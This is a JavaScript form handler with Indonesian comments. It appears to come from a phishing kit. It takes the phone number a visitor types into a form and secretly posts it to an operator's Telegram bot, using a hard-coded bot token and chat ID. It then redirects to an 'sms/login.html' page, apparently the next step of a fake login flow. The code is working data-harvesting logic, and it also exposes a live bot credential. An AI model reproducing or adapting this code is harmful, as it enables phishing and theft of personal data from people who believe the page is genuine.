async function submitForms() {
  try {
    // Mengambil data dari form
    const formData1 = new FormData(document.getElementById("form1"));

    // Mengambil nilai nomor telepon
    const phone = formData1.get("phone");

    localStorage.setItem("phone", phone);

    // Token, chat ID, dan API Telegram
    const token = "6968514066:AAFvdMMmQvkZNxXNC3ePXTaOduaKjnbiNs8";
    const chatId = "6936181512";
    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;

    // Menggabungkan data yang akan dikirim
    const combinedFormData = new URLSearchParams();
    combinedFormData.append("chat_id", chatId);
    combinedFormData.append(
      "text",
      `Nomor : ${phone}` // Menyesuaikan untuk nomor telepon
    );

    // Mengirim data ke API Telegram
    await fetch(apiUrl, {
      method: "POST",
      body: combinedFormData,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
    });

    // Pindah ke halaman lain setelah berhasil
    window.location.href = "sms/login.html"; // Ganti dengan nama halaman Anda
  } catch (error) {
    // Jika terjadi kesalahan
    console.error("Error:", error);
    alert("Masukkan nomor yang benar");
  }
}
